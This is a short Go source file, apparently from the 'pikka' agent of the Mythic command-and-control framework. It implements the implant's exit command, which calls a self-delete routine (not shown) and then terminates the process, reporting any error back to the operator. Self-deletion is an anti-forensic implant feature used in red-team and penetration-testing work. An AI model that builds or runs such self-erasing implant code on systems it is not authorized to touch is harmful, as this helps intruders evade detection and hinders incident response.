package exit

import (
	// Standard
	"os"

	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/pkg/utils/structs"
)

// Run - Function that executes the exit command
func Run(task structs.Task) {
	msg := task.NewResponse()

	err := selfDelete()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	os.Exit(0)
}
